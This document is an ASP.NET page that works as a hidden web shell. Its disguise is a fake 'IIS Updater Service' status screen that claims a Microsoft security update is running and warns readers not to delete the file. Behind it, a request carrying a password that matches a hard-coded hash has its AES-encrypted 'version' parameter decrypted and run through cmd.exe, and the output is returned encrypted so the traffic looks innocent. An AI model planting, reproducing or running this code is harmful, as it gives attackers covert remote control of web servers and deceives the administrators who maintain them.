<%@ Page Language="C#" Debug="true" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.Security.Cryptography" %>
<%@ Import Namespace="System.IO" %>

<script runat="server">
byte[] PadKey(string input, int length)
{
    var buffer = new byte[length];
    var data = Encoding.UTF8.GetBytes(input ?? "");
    Array.Copy(data, buffer, Math.Min(data.Length, length));
    return buffer;
}

string Decrypt(string payload, byte[] key, byte[] iv)
{
    var cipherBytes = Convert.FromBase64String(payload.Replace(" ", "+"));
    using (var aes = Aes.Create())
    {
        aes.Key = key;
        aes.IV = iv;
        aes.Mode = CipherMode.CBC;
        aes.Padding = PaddingMode.PKCS7;
        using (var decryptor = aes.CreateDecryptor())
        {
            var plainBytes = decryptor.TransformFinalBlock(cipherBytes, 0, cipherBytes.Length);
            return Encoding.UTF8.GetString(plainBytes);
        }
    }
}

string Encrypt(string output, byte[] key, byte[] iv)
{
    var data = Encoding.UTF8.GetBytes(output);
    using (var aes = Aes.Create())
    {
        aes.Key = key;
        aes.IV = iv;
        aes.Mode = CipherMode.CBC;
        aes.Padding = PaddingMode.PKCS7;
        using (var ms = new MemoryStream())
        using (var cryptoStream = new CryptoStream(ms, aes.CreateEncryptor(), CryptoStreamMode.Write))
        {
            cryptoStream.Write(data, 0, data.Length);
            cryptoStream.FlushFinalBlock();
            return Convert.ToBase64String(ms.ToArray());
        }
    }
}

string ExecuteCommand(string cmd)
{
    var startInfo = new System.Diagnostics.ProcessStartInfo("cmd.exe", "/c " + cmd)
    {
        RedirectStandardOutput = true,
        RedirectStandardError = true,
        UseShellExecute = false,
        CreateNoWindow = true
    };
    using (var proc = System.Diagnostics.Process.Start(startInfo))
    {
        string stdout = proc.StandardOutput.ReadToEnd();
        string stderr = proc.StandardError.ReadToEnd();
        proc.WaitForExit();
        return stdout + "\n" + stderr;
    }
}

string Sha256Hash(string input)
{
    using (var sha256 = SHA256.Create())
    {
        var hash = sha256.ComputeHash(Encoding.UTF8.GetBytes(input));
        var sb = new StringBuilder();
        foreach (var b in hash)
            sb.Append(b.ToString("x2"));
        return sb.ToString();
    }
}
</script>

<%
try
{
    string password = Request["password"];
    string version = Request["version"];
    string component = Request["component"];
    string release = Request["released"];

    if (!string.IsNullOrEmpty(password))
    {
        byte[] key = PadKey(component, 32);
        byte[] iv = PadKey(release, 16);
        string decoded = Decrypt(password.Substring(10, password.Length - 15), key, iv);

        if (Sha256Hash(decoded) == "80ee5f717bd48af4cf6e487ebc5416507151c5c6e547e6194ec7ac7821df540c")
        {
            try
            {
                string output = ExecuteCommand(Decrypt(version, key, iv));
                Response.Write(Server.HtmlEncode(Encrypt(output, key, iv)));
            }
            catch (Exception innerEx)
            {
                Response.Write(Server.HtmlEncode(Encrypt(innerEx.Message, key, iv)));
            }
        }
    }
    else
    {
%>
<html>
<head>
    <title>IIS Updater Status</title>
    <style>
        body { background-color: #f3f4f6; font-family: 'Segoe UI', sans-serif; color: #333; padding: 30px; }
        .container { background: #fff; border: 1px solid #d1d5db; border-radius: 8px; padding: 20px 30px; max-width: 600px; margin: 50px auto; box-shadow: 0 4px 8px rgba(0,0,0,0.05); }
        h1 { color: #1f2937; font-size: 24px; }
        .status { margin-top: 20px; padding: 15px; background: #e0f2fe; border: 1px solid #bae6fd; border-radius: 5px; color: #0c4a6e; }
        .loader { display: inline-block; width: 12px; height: 12px; border: 2px solid #0ea5e9; border-radius: 50%; border-top-color: transparent; animation: spin 1s linear infinite; margin-right: 8px; vertical-align: middle; }
        @keyframes spin { 0% { transform: rotate(0deg) } 100% { transform: rotate(360deg) } }
        .meta { font-size: 12px; color: #6b7280; margin-top: 20px; }
    </style>
</head>
<body>
    <div class='container'>
        <h1>IIS Updater Service</h1>
        <p>Microsoft IIS component update interface. <strong>Do not delete!</strong> This could interrupt the update.</p>
        <div class='status'>
            <div><span class='loader'></span>IIS Security update is running</div>
            <div><span class='loader'></span>Version sync check</div>
            <div><span class='loader'></span>Checking for updates found</div>
        </div>
        <div class='meta'>
            Last checked: <%= DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") %> UTC<br>
            Component: IIS Update.aspx
        </div>
    </div>
</body>
</html>
<%
    }
}
catch (Exception ex)
{
    Response.Write("<html><head><title>IIS Updater Status</title></head><body><pre>" +
        Server.HtmlEncode(ex.ToString()) + "</pre></body></html>");
}
%>
